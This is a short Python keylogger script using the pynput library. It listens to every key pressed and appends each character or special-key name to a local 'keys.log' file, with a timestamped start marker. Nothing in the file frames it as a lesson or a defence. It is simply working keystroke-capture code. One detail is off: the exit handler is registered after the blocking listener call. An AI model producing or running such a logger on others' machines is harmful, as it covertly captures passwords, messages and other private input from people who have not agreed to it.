from pynput.keyboard import Controller, Listener
import logging
import atexit

OUTPUT_FILE = 'keys.log'

logging.basicConfig(filename=OUTPUT_FILE,
                    level=logging.INFO,
                    format='%(asctime)s |  %(levelname)s | %(message)s')

keyboard = Controller()

file = open(OUTPUT_FILE, 'a', buffering=1)

logging.info('----------START----------')


def on_press(key):
    # if key is Key.esc:
    #     return False
    if key is not None:
        try:
            # if key is alphanumeric
            file.write(key.char)
        except AttributeError:
            file.write(f'\n{key}\n')
        except TypeError:
            # sometimes it reads None key which cannot be written
            pass


with Listener(on_press=on_press) as listener:
    listener.join()


def exit_handler():
    print('closing')
    file.close()


atexit.register(exit_handler)
